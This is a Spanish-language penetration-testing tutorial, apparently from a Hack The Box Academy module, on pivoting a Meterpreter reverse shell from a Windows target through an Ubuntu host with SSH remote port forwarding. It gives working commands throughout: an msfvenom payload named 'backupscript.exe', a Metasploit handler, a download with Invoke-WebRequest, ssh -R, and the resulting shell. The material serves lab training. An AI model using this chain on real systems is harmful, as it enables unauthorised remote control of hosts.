Hemos visto el `local port forwarding`, donde SSH puede escuchar en nuestro host local y reenviar un servicio en el host remoto a nuestro puerto, y el `dynamic port forwarding`, donde podemos enviar paquetes a una red remota a través de un `pivot host`. Pero a veces, también podemos querer reenviar un servicio local al puerto remoto. Consideremos el escenario donde podemos hacer RDP en el host de Windows `Windows A`. Como se puede ver en la imagen a continuación, en nuestro caso anterior, podríamos hacer pivot en el host de Windows a través del servidor Ubuntu.

![](https://academy.hackthebox.com/storage/modules/158/33.png)

`¿Pero qué pasa si intentamos obtener una reverse shell?`

La `outgoing connection` para el host de Windows está limitada solo a la red `172.16.5.0/23`. Esto se debe a que el host de Windows no tiene ninguna conexión directa con la red en la que está el host de ataque. Si iniciamos un listener de Metasploit en nuestro host de ataque y tratamos de obtener una reverse shell, no podremos obtener una conexión directa aquí porque el servidor de Windows no sabe cómo enrutar el tráfico que sale de su red (172.16.5.0/23) para llegar a la 10.129.x.x (la red del Academy Lab).

Hay varias ocasiones durante un `penetration testing engagement` en las que solo tener una conexión de escritorio remoto no es factible. Es posible que quieras `upload`/`download` archivos (cuando el portapapeles de RDP está deshabilitado), `use exploits` o `low-level Windows API` usando una sesión de Meterpreter para realizar la enumeración en el host de Windows, lo cual no es posible usando los [Windows executables](https://lolbas-project.github.io/) incorporados.

En estos casos, tendríamos que encontrar un `pivot host`, que es un punto de conexión común entre nuestro host de ataque y el servidor de Windows. En nuestro caso, nuestro `pivot host` sería el servidor Ubuntu ya que puede conectarse tanto a `nuestro host de ataque` como al `Windows target`. Para obtener una `Meterpreter shell` en Windows, crearemos un payload Meterpreter HTTPS usando `msfvenom`, pero la configuración de la conexión inversa para el payload sería la dirección IP del host del servidor Ubuntu (`172.16.5.129`). Usaremos el puerto 8080 en el servidor Ubuntu para reenviar todos nuestros paquetes inversos al puerto 8000 de nuestro host de ataque, donde está corriendo nuestro listener de Metasploit.

### Creating a Windows Payload with msfvenom

```r
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### Configuring & Starting the multi/handler

```r
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Una vez que nuestro payload está creado y tenemos nuestro listener configurado y en ejecución, podemos copiar el payload al servidor Ubuntu usando el comando `scp` ya que ya tenemos las credenciales para conectarnos al servidor Ubuntu usando SSH.

### Transferring Payload to Pivot Host

```r
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

Después de copiar el payload, iniciaremos un `python3 HTTP server` usando el siguiente comando en el servidor Ubuntu en el mismo directorio donde copiamos nuestro payload.

### Starting Python3 Webserver on Pivot Host

```r
ubuntu@Webserver$ python3 -m http.server 8123
```

### Downloading Payload from Windows Target

Podemos descargar este `backupscript.exe` desde el host de Windows a través de un navegador web o el cmdlet de PowerShell `Invoke-WebRequest`.

```r
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Una vez que hemos descargado nuestro payload en el host de Windows, utilizaremos `SSH remote port forwarding` para reenviar conexiones desde el puerto 8080 del servidor Ubuntu al servicio listener de msfconsole en el puerto 8000. Usaremos el argumento `-vN` en nuestro comando SSH para hacerlo verbose y pedirle que no solicite la shell de inicio de sesión. El comando `-R` le pide al servidor Ubuntu que escuche en `<targetIPaddress>:8080` y reenvíe todas las conexiones entrantes en el puerto `8080` a nuestro listener de msfconsole en `0.0.0.0:8000` de nuestro `host de ataque`.

### Using SSH -R

```r
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Después de crear el SSH remote port forward, podemos ejecutar el payload desde el objetivo de Windows. Si el payload se ejecuta como se espera e intenta conectarse de nuevo a nuestro listener, podemos ver los logs del pivot en el `pivot host`.

### Viewing the Logs from the Pivot

```r
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

Si todo está configurado correctamente, recibiremos una `Meterpreter shell` pivotada a través del servidor Ubuntu.

### Meterpreter Session Established

```r
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Nuestra sesión de Meterpreter debería mostrar que nuestra conexión entrante es desde un host local (`127.0.0.1`) ya que estamos recibiendo la conexión a través del `local SSH socket`, que creó una `outbound connection` al servidor Ubuntu. Emitir el comando `netstat` puede mostrarnos que la conexión entrante es desde el servicio SSH.

La representación gráfica a continuación proporciona una forma alternativa de entender esta técnica.

![](https://academy.hackthebox.com/storage/modules/158/44.png)

Además de responder las preguntas del desafío, practica esta técnica e intenta obtener una reverse shell desde el objetivo de Windows.